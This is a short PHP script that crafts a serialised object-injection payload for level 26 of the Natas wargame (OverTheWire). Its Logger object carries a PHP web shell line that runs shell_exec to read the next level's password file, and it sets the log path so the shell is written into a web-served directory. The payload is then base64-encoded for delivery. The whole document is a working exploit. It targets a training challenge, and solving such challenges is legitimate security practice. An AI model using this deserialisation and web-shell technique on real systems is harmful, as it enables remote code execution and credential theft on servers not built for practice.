<?php
    class Logger{
        private $logFile;
        private $exitMsg;

            function __construct(){
                // initialise variables
                $this->exitMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
                $this->logfile="/var/www/natas/natas26/img/natas26_594v588jd4skuii9au9ailkslj.php";
            }
        }
    
        $log = new Logger();
        echo base64_encode(serialize($log));
?>